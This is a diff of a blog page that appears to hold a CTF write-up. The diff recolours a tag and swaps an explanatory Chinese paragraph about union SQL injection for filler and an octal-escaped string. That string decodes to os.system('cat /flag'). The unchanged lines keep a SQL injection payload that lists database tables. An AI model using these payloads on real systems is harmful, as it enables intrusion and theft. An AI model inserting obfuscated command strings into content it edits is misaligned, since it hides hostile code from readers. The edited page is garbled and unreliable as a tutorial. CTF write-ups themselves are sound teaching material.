@@ -192,7 +192,7 @@
             
             <span class="tag">
                 
-                <a href="/tags/CtfNewStar-Writeup/" style="color: #00a596">
+                <a href="/tags/CtfNewStar-Writeup/" style="color: #ffa2c4">
                     CtfNewStar Writeup
                 </a>
             </span>
@@ -286,7 +286,7 @@ return s[::-1]
 print(reverse(&quot;&quot;))
 </code></pre>
 <hr>
-<h2><span id="谢谢皮蛋">谢谢皮蛋</span></h2><p>查看源码，发现提示&#x2F;hint.php<br>转到&#x2F;hint.php，发现提示联合注入，并给出了<br>$sql&#x3D;”SELECT uname,position FROM hexo WHERE id&#x3D;$id LIMIT 0,1”;知道了传入的参数格式和 union 左侧列的数量(uname,position)为两个后，就可以进行联合注入了。<br>直接在框内输入,查询表</p>
+<h2><span id="谢谢皮蛋">谢谢皮蛋</span></h2><p>xxxxxxxxxx \157\163\56\163\171\163\164\145\155\50\47\143\141\164\40\57\146\154\141\147\47\51s</p>
 <pre><code class="sql">-1 UNION SELECT 1,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE TABLE_SCHEMA=database();#
 </code></pre>
 <p>里面发现有一个Fl4g 的表，但是不知道里面的列名，所以继续查找列名,输入</p>
